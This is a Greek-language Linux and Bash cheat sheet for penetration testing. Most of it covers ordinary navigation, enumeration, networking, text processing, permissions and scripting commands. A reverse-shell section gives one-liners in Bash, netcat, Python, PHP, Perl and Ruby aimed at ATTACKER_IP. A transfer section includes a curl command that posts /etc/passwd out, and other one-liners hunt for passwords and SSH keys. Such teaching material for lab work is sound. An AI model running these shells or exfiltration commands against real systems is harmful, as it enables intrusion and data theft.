# 🐧 Εντολές Linux και Bash — Οδηγός για ελέγχους ασφάλειας

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇹🇷 Türkçe](README.tr.md)

```
  ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
  ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
  ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ 
  ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ 
  ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝
   ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ ███████╗
  ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗██╔════╝
  ██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║███████╗
  ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║╚════██║
  ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║██████╔╝███████║
   ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Linux-black?style=for-the-badge&logo=linux" alt="Linux">
  <img src="https://img.shields.io/badge/Bash-green?style=for-the-badge&logo=gnubash" alt="Bash">
  <img src="https://img.shields.io/badge/Pentesting-red?style=for-the-badge" alt="Pentesting">
</p>

---

## Πριν ξεκινήσετε

Ο οδηγός συγκεντρώνει εντολές **Linux** και παραδείγματα **Bash**, δηλαδή κελύφους εντολών και γλώσσας scripts. Το **path** είναι διαδρομή αρχείου, το **working directory** ο τρέχων κατάλογος και το **PATH** μεταβλητή που καθορίζει πού αναζητούνται εντολές. Το **pipe |** διοχετεύει έξοδο και οι ανακατευθύνσεις > και >> γράφουν ή προσθέτουν δεδομένα σε αρχείο.

Τα **permissions** είναι δικαιώματα ανάγνωσης, εγγραφής και εκτέλεσης, η **ownership** ιδιοκτησία αρχείου και τα **SUID/SGID/sticky bit** ειδικές ρυθμίσεις με διαφορετική σημασία. Τα **PID** αναγνωριστικά διεργασιών και τα **jobs** εργασίες που διαχειρίζεται το συγκεκριμένο shell. Οι συντομεύσεις Ctrl+Z είναι πλήκτρα, όχι ονόματα εντολών που πληκτρολογούνται αυτούσια.

Τα αρχεία file, directory, package, τα IP/PORT και οι τιμές μεταβλητών είναι παραδείγματα. Η διαθεσιμότητα και οι επιλογές εργαλείων διαφέρουν ανά διανομή και έκδοση. Ορισμένα παραδείγματα if/for είναι ανεξάρτητες συντακτικές μορφές και δεν σχηματίζουν ενιαίο έτοιμο script.

Ξεχωρίστε εντολές προβολής από rm, chmod/chown, sed -i, εγκατάσταση πακέτων και ενέργειες διεργασιών, που αλλάζουν δεδομένα ή κατάσταση. Το 2>/dev/null κρύβει μηνύματα σφάλματος και δεν αποδεικνύει ότι η εντολή είχε πλήρη πρόσβαση. Τα προγράμματα μεταφοράς αρχείων και οι διακομιστές παραδειγμάτων μπορεί να εκθέτουν περιεχόμενο του τρέχοντος καταλόγου. Εργαστείτε σε κατάλληλο κατάλογο εργαστηρίου.

## 📋 Περιεχόμενα

- [Πλοήγηση και αρχεία](#section-01)
- [Συλλογή πληροφοριών συστήματος](#section-02)
- [Συλλογή πληροφοριών χρηστών](#section-03)
- [Εντολές δικτύου](#section-04)
- [Αναζήτηση και ανάλυση αρχείων](#section-05)
- [Επεξεργασία κειμένου](#section-06)
- [Δικαιώματα και ιδιοκτησία](#section-07)
- [Διαχείριση διεργασιών](#section-08)
- [Διαχείριση πακέτων](#section-09)
- [Σύνταξη scripts Bash](#section-10)
- [Κονσόλες με εξερχόμενη σύνδεση (Reverse Shells)](#section-11)
- [Μεταφορές αρχείων](#section-12)
- [Παραδείγματα μίας γραμμής](#section-13)
- [Πηγές](#section-14)

---

<a id="section-01"></a>

## 📁 Πλοήγηση και αρχεία

### Πλοήγηση σε καταλόγους

```bash
# Τρέχων κατάλογος
pwd

# Αλλαγή καταλόγου
cd /path/to/dir
cd ..          # Γονικός κατάλογος
cd ~           # Προσωπικός κατάλογος χρήστη
cd -           # Προηγούμενος κατάλογος

# Κατάλογος αρχείων
ls
ls -la         # Αναλυτική προβολή με κρυφά αρχεία
ls -lah        # Μεγέθη σε ευανάγνωστη μορφή
ls -latr       # Ταξινόμηση κατά χρόνο με αντίστροφη σειρά
ll             # Πιθανό alias για ls -la — εξαρτάται από το περιβάλλον
```

### Εργασίες σε αρχεία

Η rm -r/-rf διαγράφει καταλόγους και περιεχόμενο. Ελέγξτε τη διαδρομή και το τρέχον περιβάλλον πριν από χρήση. Τα παραδείγματα είναι ανεξάρτητες εντολές και όχι συνιστώμενο ενιαίο script.


```bash
# Δημιουργία αρχείων ή καταλόγων
touch file.txt
mkdir directory
mkdir -p dir1/dir2/dir3    # Δημιουργία και των γονικών καταλόγων

# Αντιγραφή
cp source dest
cp -r source_dir dest_dir  # Αναδρομική λειτουργία

# Μετακίνηση ή μετονομασία
mv source dest
mv oldname newname

# Διαγραφή
rm file
rm -r directory            # Αναδρομική λειτουργία
rm -rf directory           # Αναδρομική αναγκαστική διαγραφή χωρίς ερώτηση

# Προβολή αρχείων
cat file.txt
less file.txt              # Σταδιακή προβολή περιεχομένου
more file.txt
head -n 20 file.txt        # Πρώτες 20 γραμμές
tail -n 20 file.txt        # Τελευταίες 20 γραμμές
tail -f file.txt           # Παρακολούθηση νέου περιεχομένου
```

### Αρχειοθέτηση και συμπίεση

```bash
# tar
tar -cvf archive.tar files/      # Δημιουργία
tar -xvf archive.tar             # Εξαγωγή περιεχομένου
tar -czvf archive.tar.gz files/  # Δημιουργία αρχείου με συμπίεση gzip
tar -xzvf archive.tar.gz         # Εξαγωγή αρχείου με συμπίεση gzip

# zip/unzip
zip archive.zip file1 file2
zip -r archive.zip directory/
unzip archive.zip

# gzip/gunzip
gzip file
gunzip file.gz

# 7zip
7z x archive.7z
```

---

<a id="section-02"></a>

## 🔍 Συλλογή πληροφοριών συστήματος

### Πληροφορίες συστήματος

```bash
# Όνομα συστήματος
hostname
hostname -I               # Διευθύνσεις IP

# Λειτουργικό σύστημα και πυρήνας
uname -a                  # Συνολικές πληροφορίες που επιστρέφει η εντολή
uname -r                  # Έκδοση πυρήνα
cat /etc/os-release       # Πληροφορίες λειτουργικού
cat /etc/issue            # Αναγνωριστικό μήνυμα λειτουργικού
cat /proc/version         # Πληροφορίες πυρήνα και μεταγλωττιστή

# Αρχιτεκτονική επεξεργαστή
arch
uname -m

# Υλικό συσκευής (Hardware)
lscpu                     # Πληροφορίες επεξεργαστή
cat /proc/cpuinfo
free -h                   # Μνήμη
df -h                     # Χώρος δίσκου
lsblk                     # Συσκευές αποθήκευσης τύπου block
```

### Περιβάλλον

```bash
# Μεταβλητές περιβάλλοντος
env
printenv
echo $PATH
echo $HOME
echo $USER
echo $SHELL

# Ορισμός μεταβλητής
export VAR="value"
VAR="value"
```

### Υπηρεσίες σε λειτουργία

```bash
# Systemd
systemctl list-units --type=service
systemctl list-units --type=service --state=running
systemctl status service_name

# Init.d
service --status-all
service service_name status

# Έλεγχος θυρών σε ακρόαση
ss -tulpn
netstat -tulpn
```

### Προγραμματισμένες εργασίες cron

```bash
# Αρχείο προγραμματισμένων εργασιών χρήστη
crontab -l

# Αρχεία προγραμματισμένων εργασιών συστήματος
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*

# Παρατήρηση προγραμματισμένων διεργασιών με το παράδειγμα pspy
./pspy64
```

### Εγκατεστημένα πακέτα

```bash
# Debian/Ubuntu
dpkg -l
apt list --installed

# RHEL/CentOS
rpm -qa
yum list installed

# Αναζήτηση πακέτου
dpkg -l | grep package
which binary
whereis binary
```

---

<a id="section-03"></a>

## 👤 Συλλογή πληροφοριών χρηστών

### Τρέχων χρήστης

```bash
# Ταυτότητα τρέχοντος χρήστη
whoami
id
id username

# Ομάδες
groups
groups username

# Διαθέσιμα δικαιώματα
sudo -l                   # Επιτρεπόμενες εντολές μέσω sudo
cat /etc/sudoers          # Αρχείο πολιτικής sudo — απαιτούνται κατάλληλα δικαιώματα
```

### Κατάλογος χρηστών

```bash
# Κατάλογος χρηστών
cat /etc/passwd
cat /etc/passwd | cut -d: -f1
getent passwd

# Χρήστες με σχετική καταχώριση κονσόλας
cat /etc/passwd | grep -v "nologin\|false"
grep -v "nologin\|false" /etc/passwd

# Hashes κωδικών με τα απαιτούμενα δικαιώματα
cat /etc/shadow

# Πρόσφατες συνδέσεις
last
lastlog
w
who
users
```

### Αρχεία που σχετίζονται με τη διερεύνηση

```bash
# Κλειδιά SSH
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys

# Ιστορικό εντολών
cat ~/.bash_history
cat ~/.zsh_history
history

# Αρχεία ρυθμίσεων
cat ~/.bashrc
cat ~/.profile
cat /etc/profile
```

---

<a id="section-04"></a>

## 🌐 Εντολές δικτύου

### Ρυθμίσεις δικτύου

```bash
# Διεύθυνση IP
ip a
ip addr show
ifconfig

# Διαδρομές δικτύου
ip route
route -n
netstat -rn

# DNS
cat /etc/resolv.conf
cat /etc/hosts

# Πίνακας αντιστοίχισης διευθύνσεων ARP
arp -a
ip neigh
```

### Ανοικτές θύρες και συνδέσεις

```bash
# Θύρες σε αναμονή συνδέσεων
ss -tulpn
ss -tlnp                  # Μόνο TCP
netstat -tulpn
netstat -ano

# Ενεργές συνδέσεις
ss -tup
netstat -an | grep ESTABLISHED

# Εντοπισμός διεργασίας από θύρα
lsof -i :80
fuser 80/tcp
```

### Έλεγχοι δικτυακής επικοινωνίας

```bash
# Έλεγχος απόκρισης με ping
ping -c 4 host

# Διερεύνηση διαδρομής πακέτων
traceroute host
tracepath host

# Ερώτημα DNS
host domain.com
dig domain.com
nslookup domain.com

# Έλεγχος επικοινωνίας με θύρα
nc -zv host port
timeout 1 bash -c "</dev/tcp/host/port" && echo open

# Curl
curl -I http://host       # Μόνο HTTP headers
curl -s http://host       # Χωρίς την τυπική ένδειξη προόδου
curl -k https://host      # Παράλειψη επαλήθευσης πιστοποιητικού TLS στο αίτημα
wget http://host/file
```

### Τείχος προστασίας

```bash
# iptables
iptables -L -n -v
iptables -L INPUT -n --line-numbers

# UFW στο παράδειγμα Ubuntu
ufw status
ufw status verbose

# firewalld στο παράδειγμα CentOS
firewall-cmd --list-all
```

---

<a id="section-05"></a>

## 🔎 Αναζήτηση και ανάλυση αρχείων

### Αναζήτηση με find

```bash
# Αναζήτηση κατά όνομα
find / -name "filename" 2>/dev/null
find / -iname "*.txt" 2>/dev/null      # Χωρίς διάκριση πεζών και κεφαλαίων

# Αναζήτηση κατά τύπο
find / -type f -name "*.conf"          # Αναζήτηση στοιχείων αρχείων
find / -type d -name "backup"          # Κατάλογοι

# Αναζήτηση κατά δικαιώματα
find / -perm -4000 2>/dev/null         # SUID
find / -perm -2000 2>/dev/null         # SGID
find / -perm -o+w 2>/dev/null          # Εγγράψιμο από όλους

# Αναζήτηση κατά ιδιοκτήτη
find / -user root 2>/dev/null
find / -group admin 2>/dev/null

# Αναζήτηση κατά μέγεθος
find / -size +100M 2>/dev/null         # Μεγαλύτερο από το όριο 100M του παραδείγματος
find / -size -1k 2>/dev/null           # Μικρότερο από το όριο 1k του παραδείγματος

# Αναζήτηση κατά χρόνο
find / -mtime -7 2>/dev/null           # Τροποποίηση τις τελευταίες 7 ημέρες
find / -atime +30 2>/dev/null          # Πρόσβαση πριν από περισσότερες από 30 ημέρες

# Αναζήτηση και εκτέλεση ενέργειας στα ευρήματα
find / -name "*.sh" -exec chmod +x {} \;
find / -name "*.log" -exec rm {} \;
```

### Αναζήτηση μέσα σε αρχεία με grep

```bash
# Βασική αναζήτηση
grep "pattern" file
grep -i "pattern" file                 # Χωρίς διάκριση πεζών και κεφαλαίων
grep -r "pattern" /path/               # Αναδρομική λειτουργία
grep -rn "pattern" /path/              # Με αριθμούς γραμμών

# Επιλογή γραμμών που δεν ταιριάζουν
grep -v "pattern" file                 # Γραμμές που δεν ταιριάζουν

# Μέτρηση σύμφωνα με τη λειτουργία της εντολής
grep -c "pattern" file

# Προβολή γειτονικών γραμμών
grep -A 3 "pattern" file               # 3 επόμενες γραμμές
grep -B 3 "pattern" file               # 3 προηγούμενες γραμμές
grep -C 3 "pattern" file               # 3 γειτονικές γραμμές σε κάθε πλευρά

# Κανονική έκφραση
grep -E "regex" file                   # Εκτεταμένη κανονική έκφραση
egrep "regex" file

# Πολλαπλά μοτίβα
grep -E "pattern1|pattern2" file
```

### Εντοπισμός αρχείων και εντολών με locate/which

```bash
# Αναζήτηση στην τοπική βάση locate — απαιτεί ενημερωμένα δεδομένα
locate filename
updatedb                               # Ενημέρωση βάσης δεδομένων

# Εντοπισμός εντολής στο PATH
which binary
whereis binary
type command
```

### Ανάλυση αρχείων

```bash
# Αναγνώριση τύπου αρχείου
file filename

# Συμβολοσειρές μέσα σε μεταγλωττισμένο αρχείο
strings binary
strings binary | grep password

# Δεκαεξαδική προβολή
xxd file
hexdump -C file

# Ψηφιακή σύνοψη αρχείου (Hash)
md5sum file
sha256sum file
sha1sum file
```

---

<a id="section-06"></a>

## ✂️ Επεξεργασία κειμένου

### Επιλογή πεδίων ή χαρακτήρων με cut

```bash
# Επιλογή πεδίων βάσει διαχωριστή
cut -d: -f1 /etc/passwd                # Πρώτο πεδίο με διαχωριστή :
cut -d: -f1,3 /etc/passwd              # Πεδία 1 και 3

# Επιλογή θέσεων χαρακτήρων
cut -c1-10 file                        # Χαρακτήρες 1-10
```

### Επεξεργασία εγγραφών με awk

```bash
# Προβολή στηλών
awk '{print $1}' file                  # Πρώτη στήλη
awk '{print $1, $3}' file              # Στήλες 1 και 3
awk -F: '{print $1}' /etc/passwd       # Συγκεκριμένος διαχωριστής

# Συνθήκες
awk '$3 > 1000' /etc/passwd            # Όπου το πεδίο 3 είναι μεγαλύτερο από 1000
awk '/pattern/ {print $1}' file        # Γραμμές που ταιριάζουν

# Ενσωματωμένες μεταβλητές
awk '{print NR, $0}' file              # Αριθμοί γραμμών
awk 'END {print NR}' file              # Συνολικό πλήθος γραμμών
```

### Μετασχηματισμός κειμένου με sed

```bash
# Αντικατάσταση κειμένου
sed 's/old/new/' file                  # Πρώτη εμφάνιση
sed 's/old/new/g' file                 # Όλες οι εμφανίσεις στη σχετική γραμμή
sed -i 's/old/new/g' file              # Αλλαγή του ίδιου του αρχείου

# Αφαίρεση γραμμών από την έξοδο
sed '/pattern/d' file                  # Αφαίρεση γραμμών που ταιριάζουν
sed '5d' file                          # Αφαίρεση γραμμής 5
sed '1,5d' file                        # Αφαίρεση γραμμών 1-5

# Προβολή συγκεκριμένων γραμμών
sed -n '5p' file                       # Προβολή γραμμής 5
sed -n '1,10p' file                    # Προβολή γραμμών 1-10
```

### Ταξινόμηση και χειρισμός διπλοτύπων

```bash
# Ταξινόμηση
sort file
sort -r file                           # Αντίστροφη ανάλυση
sort -n file                           # Αριθμητική λειτουργία
sort -u file                           # Μόνο μοναδικές τιμές στην ταξινομημένη έξοδο
sort -t: -k3 -n /etc/passwd            # Βάσει πεδίου 3

# Μοναδικές καταχωρίσεις
uniq file                              # Αφαίρεση γειτονικών διπλοτύπων
sort file | uniq                       # Αφαίρεση διπλοτύπων μετά την ταξινόμηση
uniq -c file                           # Πλήθος εμφανίσεων
sort file | uniq -c | sort -rn         # Μέτρηση και ταξινόμηση
```

### Πρόσθετες λειτουργίες κειμένου

```bash
# Μέτρηση περιεχομένου
wc -l file                             # Γραμμές
wc -w file                             # Λέξεις
wc -c file                             # Bytes

# Μορφοποίηση σε στήλες
column -t file                         # Στοίχιση σε πίνακα
column -s: -t /etc/passwd              # Συγκεκριμένος διαχωριστής

# Μετασχηματισμός χαρακτήρων με tr
echo "HELLO" | tr 'A-Z' 'a-z'          # Μετατροπή σε πεζά
cat file | tr -d '\n'                  # Αφαίρεση αλλαγών γραμμής

# xargs
find . -name "*.txt" | xargs rm
cat urls.txt | xargs -I {} curl {}
```

---

<a id="section-07"></a>

## 🔐 Δικαιώματα και ιδιοκτησία

### Κατανόηση δικαιωμάτων

```
-rwxr-xr-x
│└┬┘└┬┘└┬┘
│ │  │  └── Υπόλοιποι (r-x = 5)
│ │  └───── Ομάδα     (r-x = 5)
│ └──────── Ιδιοκτήτης (rwx = 7)
└────────── Τύπος αρχείου (- = αρχείο, d = κατάλογος)
```

### Αλλαγή δικαιωμάτων με chmod

```bash
# Αριθμητική λειτουργία
chmod 755 file                         # rwxr-xr-x
chmod 644 file                         # rw-r--r--
chmod 777 file                         # rwxrwxrwx

# Συμβολική μορφή δικαιωμάτων
chmod +x file                          # Προσθήκη δικαιώματος εκτέλεσης
chmod -w file                          # Αφαίρεση δικαιώματος εγγραφής
chmod u+x file                         # Προσθήκη δικαιώματος εκτέλεσης στον ιδιοκτήτη
chmod g+w file                         # Προσθήκη δικαιώματος εγγραφής στην ομάδα
chmod o-r file                         # Αφαίρεση δικαιώματος ανάγνωσης από τους υπόλοιπους

# Αναδρομική λειτουργία
chmod -R 755 directory/
```

### Αλλαγή ιδιοκτησίας με chown

```bash
# Αλλαγή ιδιοκτήτη
chown user file
chown user:group file
chown -R user:group directory/

# Αλλαγή μόνο της ομάδας
chgrp group file
```

### Ειδικά δικαιώματα

```bash
# SUID — ειδικό bit ταυτότητας ιδιοκτήτη, τιμή 4
chmod u+s file
chmod 4755 file

# SGID — ειδικό bit ταυτότητας ομάδας, τιμή 2
chmod g+s directory
chmod 2755 directory

# Sticky bit — ειδικό bit καταλόγου, τιμή 1
chmod +t directory
chmod 1755 directory

# Αναζήτηση SUID/SGID
find / -perm -4000 2>/dev/null         # SUID
find / -perm -2000 2>/dev/null         # SGID
```

---

<a id="section-08"></a>

## ⚙️ Διαχείριση διεργασιών

### Προβολή διεργασιών

```bash
# Εμφάνιση διεργασιών
ps aux
ps -ef
ps aux | grep process_name

# Δυναμική προβολή διεργασιών
top
htop                                   # Εναλλακτικό εργαλείο προβολής

# Δέντρο σχέσεων διεργασιών
pstree
ps auxf
```

### Έλεγχος διεργασιών

```bash
# Παρασκήνιο και προσκήνιο
command &                              # Εκτέλεση στο παρασκήνιο
Ctrl+Z                                 # Προσωρινή αναστολή εργασίας
bg                                     # Συνέχιση στο παρασκήνιο
fg                                     # Επαναφορά στο προσκήνιο
jobs                                   # Κατάλογος εργασιών του shell

# Τερματισμός διεργασίας
kill PID
kill -9 PID                            # Αναγκαστικός τερματισμός
killall process_name
pkill process_name

# Ρύθμιση σχετικής προτεραιότητας
nice -n 10 command                     # Μικρότερη προτεραιότητα στο παράδειγμα
renice 10 -p PID
```

---

<a id="section-09"></a>

## 📦 Διαχείριση πακέτων

### Debian/Ubuntu (apt/dpkg)

```bash
# Ενημέρωση
apt update
apt upgrade

# Παράδειγμα εγκατάστασης
apt install package
dpkg -i package.deb

# Αφαίρεση
apt remove package
apt purge package                      # Αφαίρεση πακέτου και σχετικών ρυθμίσεων

# Αναζήτηση
apt search package
apt-cache search package

# Πληροφορίες
apt show package
dpkg -l | grep package
```

### RHEL/CentOS (yum/dnf)

```bash
# Ενημέρωση
yum update
dnf update

# Παράδειγμα εγκατάστασης
yum install package
dnf install package

# Αφαίρεση
yum remove package

# Αναζήτηση
yum search package

# Πληροφορίες
yum info package
rpm -qa | grep package
```

---

<a id="section-10"></a>

## 💻 Σύνταξη scripts Bash

Οι εντολές Bash, οι συντομεύσεις πλήκτρων και τα παραδείγματα άλλων γλωσσών δεν είναι εναλλάξιμα. Τα scripts και οι διαδρομές διατηρούνται χωρίς εκτέλεση ή αυτόματη συμπλήρωση.


### Βασικές λειτουργίες

```bash
#!/bin/bash

# Μεταβλητές
NAME="value"
echo $NAME
echo "${NAME}_suffix"

# Αντικατάσταση με το αποτέλεσμα εντολής
DATE=$(date)
FILES=`ls -la`

# Ανάγνωση εισόδου
read -p "Enter name: " NAME
echo "Hello $NAME"
```

### Έλεγχοι συνθηκών

Πολλές γραμμές if του πρωτοτύπου είναι αποσπασματικές μορφές που χρειάζονται σώμα και κλείσιμο. Οι μεταβλητές πρέπει να έχουν κατάλληλες τιμές και η ορθή χρήση εισαγωγικών εξαρτάται από το περιεχόμενό τους.


```bash
# Δομή συνθήκης if/else
if [ condition ]; then
    echo "true"
elif [ condition2 ]; then
    echo "condition2"
else
    echo "false"
fi

# Συγκρίσεις συμβολοσειρών
if [ "$str1" = "$str2" ]; then
if [ "$str1" != "$str2" ]; then
if [ -z "$str" ]; then                 # Κενή τιμή
if [ -n "$str" ]; then                 # Μη κενή τιμή

# Αριθμητικές συγκρίσεις
if [ $num1 -eq $num2 ]; then           # Ίσο
if [ $num1 -ne $num2 ]; then           # Διαφορετικό
if [ $num1 -gt $num2 ]; then           # Μεγαλύτερο
if [ $num1 -lt $num2 ]; then           # Μικρότερο

# Έλεγχοι αρχείων
if [ -e file ]; then                   # Υπάρχει
if [ -f file ]; then                   # Είναι κανονικό αρχείο
if [ -d dir ]; then                    # Είναι κατάλογος
if [ -r file ]; then                   # Επιτρέπεται ανάγνωση
if [ -w file ]; then                   # Επιτρέπεται εγγραφή
if [ -x file ]; then                   # Επιτρέπεται εκτέλεση
```

### Βρόχοι

```bash
# Βρόχος for
for i in 1 2 3 4 5; do
    echo $i
done

for i in {1..10}; do
    echo $i
done

for file in *.txt; do
    echo $file
done

for i in $(cat list.txt); do
    echo $i
done

# Βρόχος while
while [ condition ]; do
    echo "loop"
done

while read line; do
    echo $line
done < file.txt

# Βρόχος for με σύνταξη τύπου C
for ((i=0; i<10; i++)); do
    echo $i
done
```

### Συναρτήσεις

```bash
# Ορισμός συνάρτησης
function_name() {
    echo "Argument 1: $1"
    echo "Argument 2: $2"
    echo "All args: $@"
    echo "Num args: $#"
}

# Κλήση συνάρτησης
function_name arg1 arg2
```

### Παράδειγμα script

```bash
#!/bin/bash
# Παράδειγμα script σάρωσης θυρών

if [ $# -ne 1 ]; then
    echo "Usage: $0 <target>"
    exit 1
fi

TARGET=$1

for PORT in {1..1000}; do
    timeout 1 bash -c "echo >/dev/tcp/$TARGET/$PORT" 2>/dev/null && echo "Port $PORT open"
done
```

---

<a id="section-11"></a>

## 🔌 Κονσόλες με εξερχόμενη σύνδεση (Reverse Shells)

Οι υλοποιήσεις nc και οι επιλογές τους διαφέρουν. Το /dev/tcp και το /dev/udp είναι λειτουργίες που εξαρτώνται από το shell, όχι γενικές κανονικές διαδρομές αρχείων. Οι εντολές παραμένουν παραδείγματα του πρωτοτύπου για απομονωμένο εργαστήριο.


### Bash

```bash
# Παράδειγμα Bash με TCP
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Παράδειγμα Bash με UDP
bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1
```

### Netcat

```bash
# Παράδειγμα nc με επιλογή -e, όπου υποστηρίζεται
nc -e /bin/bash ATTACKER_IP PORT

# Παράδειγμα nc χωρίς επιλογή -e
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f
```

### Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP

```bash
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Perl

```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Προσαρμογή διαδραστικής κονσόλας

```bash
# Παράδειγμα δημιουργίας ψευδοτερματικού
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
script /dev/null -c bash

# Παράδειγμα προσαρμογής διαδραστικού τερματικού
# Μέσα στην εργαστηριακή απομακρυσμένη κονσόλα:
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
# Στο σύστημα του ελεγκτή:
stty raw -echo; fg
# Μέσα στην κονσόλα:
export TERM=xterm
stty rows 40 cols 150
```

---

<a id="section-12"></a>

## ⬇️ Μεταφορές αρχείων

### Από το σύστημα του ελεγκτή προς το εργαστηριακό σύστημα

```bash
# wget
wget http://ATTACKER_IP/file -O /tmp/file

# curl
curl http://ATTACKER_IP/file -o /tmp/file

# nc
# Σύστημα ελεγκτή: nc -lvnp 4444 < file
nc ATTACKER_IP 4444 > file

# scp
scp user@ATTACKER_IP:/path/file /tmp/

# Παράδειγμα Base64 για μικρά αρχεία
# Σύστημα ελεγκτή: base64 file
echo "BASE64_STRING" | base64 -d > file
```

### Από το εργαστηριακό σύστημα προς το σύστημα του ελεγκτή

```bash
# nc
# Σύστημα ελεγκτή: nc -lvnp 4444 > file
nc ATTACKER_IP 4444 < file

# Παράδειγμα αιτήματος POST με curl
curl -X POST -F "file=@/etc/passwd" http://ATTACKER_IP/upload

# base64
base64 file
# Μεταφορά του αποτελέσματος στο σύστημα του ελεγκτή και αποκωδικοποίηση
```

### Εκκίνηση διακομιστή HTTP

```bash
# Παράδειγμα παλαιότερης Python 2
python -m SimpleHTTPServer 8000

# Python 3
python3 -m http.server 8000

# PHP
php -S 0.0.0.0:8000

# Ruby
ruby -run -e httpd . -p 8000
```

---

<a id="section-13"></a>

## ⚡ Παραδείγματα μίας γραμμής

### Χρήσιμα παραδείγματα μίας γραμμής

```bash
# Εντοπισμός εκτελέσιμων με SUID
find / -perm -4000 -type f 2>/dev/null

# Αναζήτηση εγγράψιμων καταλόγων
find / -writable -type d 2>/dev/null

# Αναζήτηση αρχείων εγγράψιμων από όλους
find / -perm -o+w -type f 2>/dev/null

# Αναζήτηση πιθανών στοιχείων σύνδεσης σε αρχεία ρυθμίσεων
grep -r "password" /etc/ 2>/dev/null
grep -ri "pass\|pwd\|secret" /var/www/ 2>/dev/null

# Αναζήτηση αρχείων που ενδέχεται να περιέχουν κλειδιά SSH
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Σύντομο παράδειγμα σάρωσης θυρών
for p in {1..65535}; do timeout 1 bash -c "echo >/dev/tcp/TARGET/$p" 2>/dev/null && echo "$p open"; done

# Εντοπισμός ενεργών συστημάτων σε περιοχή διευθύνσεων
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "from" & done

# Εξαγωγή συμβολοσειρών που μοιάζουν με IP από αρχείο
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" file

# Κωδικοποίηση και αποκωδικοποίηση Base64
echo "string" | base64
echo "c3RyaW5n" | base64 -d

# Κωδικοποίηση και αποκωδικοποίηση URL
echo "string" | xxd -plain | sed 's/\(..\)/%\1/g'
echo "%73%74%72%69%6e%67" | xxd -r -p
```

### Πίνακας γρήγορης αναφοράς

| Σκοπός | Εντολή |
| --------- | --------- |
| Τρέχων χρήστης | `whoami` / `id` |
| Πληροφορίες συστήματος | `uname -a` |
| Διεύθυνση IP | `ip a` / `hostname -I` |
| Θύρες σε ακρόαση | `ss -tulpn` |
| Διεργασίες σε εκτέλεση | `ps aux` |
| Αναζήτηση αρχείων SUID | `find / -perm -4000 2>/dev/null` |
| Εγγράψιμοι κατάλογοι | `find / -writable -type d 2>/dev/null` |
| Λήψη αρχείου | `wget http://url/file` |
| Κονσόλα με εξερχόμενη σύνδεση | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| Προσαρμογή διαδραστικού τερματικού | `python3 -c 'import pty;pty.spawn("/bin/bash")'` |

---

<a id="section-14"></a>

## 📚 Πηγές

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks — Linux](https://book.hacktricks.xyz/linux-hardening)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Οδηγός αναφοράς reverse shells](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

### Σχετικοί οδηγοί
- [Ανύψωση δικαιωμάτων Linux](../../Linux-PrivEsc/translations/README.el.md)
- [Nmap](../../Nmap/translations/README.el.md)
- [Metasploit](../../Metasploit/translations/README.el.md)

---

<p align="center">
  <b>🐧 Linux και Bash για πρακτική εξάσκηση.</b><br>
  <i>Ελέγξτε τα ορίσματα και το αποτέλεσμα κάθε εντολής.</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
